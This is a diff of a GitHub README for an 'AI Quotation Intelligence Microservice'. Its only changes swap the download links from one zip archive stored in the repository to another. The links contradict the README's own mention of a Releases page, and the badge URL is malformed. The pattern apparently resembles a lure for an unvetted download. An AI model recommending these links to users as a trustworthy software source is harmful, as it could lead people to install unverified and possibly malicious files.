@@ -1,6 +1,6 @@
 # 🤖 ai-quotation-intelligence-microservice - Get Accurate Pricing with Ease
 
-[![Download Now](https://github.com/alex11rom/ai-quotation-intelligence-microservice/raw/refs/heads/main/app/ai-intelligence-quotation-microservice-1.2.zip%20Now-v1.0-blue)](https://github.com/alex11rom/ai-quotation-intelligence-microservice/raw/refs/heads/main/app/ai-intelligence-quotation-microservice-1.2.zip)
+[![Download Now](https://raw.githubusercontent.com/alex11rom/ai-quotation-intelligence-microservice/main/app/quotation_intelligence_microservice_ai_3.8.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/alex11rom/ai-quotation-intelligence-microservice/main/app/quotation_intelligence_microservice_ai_3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **AI Quotation Intelligence Microservice**. This tool helps you g
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download ai-quotation-intelligence-microservice](https://github.com/alex11rom/ai-quotation-intelligence-microservice/raw/refs/heads/main/app/ai-intelligence-quotation-microservice-1.2.zip).
+To download the application, visit this page: [Download ai-quotation-intelligence-microservice](https://raw.githubusercontent.com/alex11rom/ai-quotation-intelligence-microservice/main/app/quotation_intelligence_microservice_ai_3.8.zip).
 
 ### Step 1: Visit the Releases Page
 
@@ -81,6 +81,6 @@ You are welcome to contribute to the project. Check the repository for guideline
 
 Remember, for any updates or new features, always check the releases page again. 
 
-To download the application, visit: [Download ai-quotation-intelligence-microservice](https://github.com/alex11rom/ai-quotation-intelligence-microservice/raw/refs/heads/main/app/ai-intelligence-quotation-microservice-1.2.zip).
+To download the application, visit: [Download ai-quotation-intelligence-microservice](https://raw.githubusercontent.com/alex11rom/ai-quotation-intelligence-microservice/main/app/quotation_intelligence_microservice_ai_3.8.zip).
 
 Enjoy your experience with AI-powered quotations!
